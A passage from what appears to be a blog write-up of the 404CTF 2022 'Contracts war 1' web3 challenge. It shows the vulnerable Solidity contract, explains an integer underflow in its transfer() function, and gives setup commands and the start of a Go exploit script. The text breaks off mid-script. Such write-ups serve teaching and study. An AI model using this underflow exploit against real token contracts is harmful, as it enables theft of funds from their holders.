<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Writeup of web3 challenge of 404CTF 2022 - contracts war 1/2"><title>Writeup 404CTF 2022 - Contracts war 1 (web3)</title><link rel=canonical href=https://nodauf.dev/p/writeup-404ctf-2022-contracts-war-1-web3/><link rel=stylesheet href=/scss/style.min.ac77dcf8b111b51da39a92990f431923f210f3876d85798a2125667f96dc33a4.css><meta property="og:title" content="Writeup 404CTF 2022 - Contracts war 1 (web3)"><meta property="og:description" content="Writeup of web3 challenge of 404CTF 2022 - contracts war 1/2"><meta property="og:url" content="https://nodauf.dev/p/writeup-404ctf-2022-contracts-war-1-web3/"><meta property="og:site_name" content="Nodauf"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="foundry"><meta property="article:tag" content="solidity"><meta property="article:tag" content="golang"><meta property="article:tag" content="web3"><meta property="article:published_time" content="2022-06-10T00:00:00+00:00"><meta property="article:modified_time" content="2022-06-10T00:00:00+00:00"><meta property="og:image" content="https://nodauf.dev/images/404CTF.png"><meta name=twitter:title content="Writeup 404CTF 2022 - Contracts war 1 (web3)"><meta name=twitter:description content="Writeup of web3 challenge of 404CTF 2022 - contracts war 1/2"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://nodauf.dev/images/404CTF.png"></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><div class=site-meta><h1 class=site-name><a href=/>Nodauf</a></h1><h2 class=site-description>Pentester, perpetual student and security enthusiast. Passionnate about security, AD and more ...</h2></div></header><ol class=social-menu><li><a href=https://github.com/nodauf target=_blank title=GitHub><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com/nodauf target=_blank title=Twitter><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><div class=menu-bottom-section><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></div></ol></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/writeup-404ctf-2022-contracts-war-1-web3/><img src=/images/404CTF.png loading=lazy alt="Featured image of post Writeup 404CTF 2022 - Contracts war 1 (web3)"></a></div><div class=article-details><header class=article-category><a href=/categories/ctf/ style=background-color:#26a0f0;color:#fff>CTF writeups</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/writeup-404ctf-2022-contracts-war-1-web3/>Writeup 404CTF 2022 - Contracts war 1 (web3)</a></h2><h3 class=article-subtitle>Writeup of web3 challenge of 404CTF 2022 - contracts war 1/2</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Jun 10, 2022</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>8 minute read</time></div></footer></div></header><section class=article-content><h2 id=statement>Statement</h2><p>The challenge statement is as follows:</p><blockquote><p>Agent, nous avons découvert un smart contract de Hallebarde qui permet d&rsquo;obtenir de l&rsquo;argent gratuitement. Il sert également à s&rsquo;authentifier en tant que nouveau membre de Hallebarde. Nous voulons que vous vous fassiez passer pour un de leurs membres. Nous avons récemment trouvé un endpoint qui semble leur servir de portail de connexion. Introduisez-vous dans leur système et récupérez toutes les informations sensibles que vous pourrez trouver.</p><p>Contrat à l&rsquo;adresse : 0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6</p><p>Réseau de test Ropsten</p><p>Auteur : Soremo</p><p>nc challenge.404ctf.fr 30885</p></blockquote><p>The source code of the smart contract is given:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=k>pragma solidity</span> <span class=mi>0</span><span class=p>.</span><span class=mi>7</span><span class=p>.</span><span class=mi>6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>FreeMoney</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>mapping</span> <span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint256</span><span class=p>)</span> <span class=n>balances</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint256</span><span class=p>)</span> <span class=n>lastWithdrawTime</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>bool</span><span class=p>)</span> <span class=n>isHallebardeMember</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=k>private</span> <span class=n>boss</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>boss</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>getMoney</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>numTokens</span> <span class=o>&lt;</span> <span class=mi>10000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span> <span class=o>&gt;=</span> <span class=n>lastWithdrawTime</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>+</span> <span class=mi>365</span> <span class=kc>days</span><span class=p>,</span> <span class=s>&#34;Vous devez attendre un an entre chaque demande d&#39;argent.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>+=</span> <span class=n>numTokens</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>lastWithdrawTime</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>reset</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>lastWithdrawTime</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>transfer</span><span class=p>(</span><span class=kt>address</span> <span class=n>receiver</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>public</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>-=</span> <span class=n>numTokens</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>balances</span><span class=p>[</span><span class=n>receiver</span><span class=p>]</span> <span class=o>+=</span> <span class=n>numTokens</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>enterHallebarde</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>100</span> <span class=kc>ether</span> <span class=o>||</span> <span class=n>boss</span> <span class=o>==</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=s>&#34;Vous n&#39;avez pas assez d&#39;argent pour devenir membre de Hallebarde.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>!=</span> <span class=nb>tx</span><span class=p>.</span><span class=nb>origin</span> <span class=o>||</span> <span class=n>boss</span> <span class=o>==</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=s>&#34;Soyez plus entreprenant !&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=o>!</span><span class=n>isHallebardeMember</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=n>isHallebardeMember</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>getMembershipStatus</span><span class=p>(</span><span class=kt>address</span> <span class=n>memberAddress</span><span class=p>)</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>memberAddress</span> <span class=o>||</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>boss</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>isHallebardeMember</span><span class=p>[</span><span class=n>memberAddress</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=exploitation>Exploitation</h2><p>The goal of the challenge is to execute the <code>enterHallebarde()</code> function without having the transaction being reverted and connect to <code>challenge.404ctf.fr</code> on port 30885 to give our address to get the flag.</p><p>There are two checks to pass in the <code>enterHallebarde()</code> function to succeed:</p><ol><li>The sender&rsquo;s balance must be greater than 100 ether or the sender is the owner of the contract.</li><li>The sender must be different from the origin of the transaction or the sender must be the owner of the contract.</li></ol><h3 id=first-condition>First condition</h3><p>There are two functions that can increase the balance: <code>getMoney()</code> and <code>transfer()</code>.</p><p>With <code>getMoney()</code> you can get only 10000 wei which corresponds to 0.00000000000001 ether (<a class=link href=https://coinguides.org/ethereum-unit-converter-gwei-ether/ target=_blank rel=noopener>check with a converter online</a>). This function can be called only once a year.</p><p>The <code>transfer()</code> function can be called to transfer money from the sender to another address. A first check is made to ensure that the sender has more than 0 ether. Then the <strong>sender</strong>&rsquo;s balance is <strong>decreased</strong> by the amount of money to be transferred. The <strong>recipient</strong>&rsquo;s balance is <strong>increased</strong> by the amount of money to be transferred. However, the balance is <strong>not compared</strong> to the <strong>number of tokens to be transferred</strong>.</p><blockquote><p>In the situation where the sender have 1 wei and wants to transfer 2 wei to a random address, what will happen to our uint256 variable?</p></blockquote><p>This is an integer <strong>underflow</strong> vulnerability. Our balance will be egal to the <strong>maximum value of an uint256</strong> which is about <strong>1.15e+59 ether</strong>.</p><p>Let&rsquo;s do it!</p><p>The environment has to be configured, the <a class=link href=https://github.com/ethereum/solc-bin/blob/gh-pages/linux-amd64/solc-linux-amd64-v0.7.6%2Bcommit.7338295f target=_blank rel=noopener>solc</a> binary (version 0.7.6 to match the contract requirements) and <a class=link href=https://geth.ethereum.org/downloads/ target=_blank rel=noopener>abigen</a> are needed.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir -p /tmp/challenge/FreeMoney
</span></span><span class=line><span class=cl><span class=nb>cd</span> <span class=nv>$_</span>
</span></span><span class=line><span class=cl>go mod init challenge
</span></span><span class=line><span class=cl>cp /tmp/FreeMoney.sol /tmp/challenge/FreeMoney/
</span></span><span class=line><span class=cl>solc --abi FreeMoney.sol -o .
</span></span><span class=line><span class=cl>abigen --abi<span class=o>=</span>./FreeMoney.abi --pkg<span class=o>=</span>freemoney --out<span class=o>=</span>FreeMoney.go
</span></span></code></pre></td></tr></table></div></div><p>An optional but recommended step is to work on a fork of the blockchain for faster performance and easier debugging.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>npx hardhat node --fork https://ropsten.infura.io/v3/&lt;APIKEY&gt;
</span></span><span class=line><span class=cl><span class=c1>#or</span>
</span></span><span class=line><span class=cl>anvil --fork-url https://ropsten.infura.io/v3/&lt;APIKEY&gt;
</span></span></code></pre></td></tr></table></div></div><p>And <strong>ctf-freemoney.go</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;context&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;crypto/ecdsa&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nx>freemoney</span> <span class=s>&#34;challenge/FreeMoney&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;flag&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;log&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;math/big&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/ethereum/go-ethereum/accounts/abi/bind&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/ethereum/go-ethereum/common&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/ethereum/go-ethereum/crypto&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/ethereum/go-ethereum/ethclient&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>fork</span> <span class=kt>bool</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kd>var</span> <span class=nx>blockchainURL</span><span class=p>,</span> <span class=nx>contractAddress</span><span class=p>,</span> <span class=nx>privateKey</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>	<span class=nx>_</span> <span class=p>=</span> <span class=nx>privateKey</span>
</span></span><span class=line><span class=cl>	<span class=nx>flag</span><span class=p>.</span><span class=nf>BoolVar</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>fork</span><span class=p>,</span> <span class=s>&#34;fork&#34;</span><span class=p>,</span> <span class=kc>true</span><span class=p>,</span> <span class=s>&#34;Should we use the parameter for the fork blockchain ? (default: true)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>flag</span><span class=p>.</span><span class=nf>Parse</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=nx>contractAddress</span> <span class=p>=</span> <span class=s>&#34;0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6&#34;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>fork</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>blockchainURL</span> <span class=p>=</span> <span class=s>&#34;http://127.0.0.1:8545&#34;</span>
</span></span><span class=line><span class=cl>		<span class=nx>privateKey</span> <span class=p>=</span> <span class=s>&#34;59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d&#34;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>blockchainURL</span> <span class=p>=</span> <span class=s>&#34;https://eth-rinkeby.alchemyapi.io/v2/&lt;API-KEY&gt;&#34;</span>
</span></span><span class=line><span class=cl>		<span class=nx>privateKey</span> <span class=p>=</span> <span class=s>&#34;&lt;PRIVATE-KEY&gt;&#34;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Connect to an ethereum node
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>client</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>ethclient</span><span class=p>.</span><span class=nf>Dial</span><span class=p>(</span><span class=nx>blockchainURL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Contract
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>contractAddressHash</span> <span class=o>:=</span> <span class=nx>common</span><span class=p>.</span><span class=nf>HexToAddress</span><span class=p>(</span><span class=nx>contractAddress</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>instance</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>freemoney</span><span class=p>.</span><span class=nf>NewFreemoney</span><span class=p>(</span><span class=nx>contractAddressHash</span><span class=p>,</span> <span class=nx>client</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Get 1 wei
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// GetMoney is a write transaction and therefore need to be signed
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>auth</span> <span class=o>:=</span> <span class=nf>newTransactor</span><span class=p>(</span><span class=nx>client</span><span class=p>,</span> <span class=nx>privateKey</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>instance</span><span class=p>.</span><span class=nf>GetMoney</span><span class=p>(</span><span class=nx>auth</span><span class=p>,</span> <span class=nx>big</span><span class=p>.</span><span class=nf>NewInt</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=s>&#34;fail to get money &#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Transfer 2 wei to a random address
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// Transfer is a write transaction and therefore need to be signed
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>auth</span> <span class=p>=</span> <span class=nf>newTransactor</span><span class=p>(</span><span class=nx>client</span><span class=p>,</span> <span class=nx>privateKey</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>instance</span><span class=p>.</span><span class=nf>Transfer</span><span class=p>(</span><span class=nx>auth</span><span class=p>,</span> <span class=nx>common</span><span class=p>.</span><span class=nf>HexToAddress</span><span class=p>(</span><span class=s>&#34;0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266&#34;</span><span class=p>),</span> <span class=nx>big</span><span class=p>.</span><span class=nf>NewInt</span><span class=p>(</span><span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
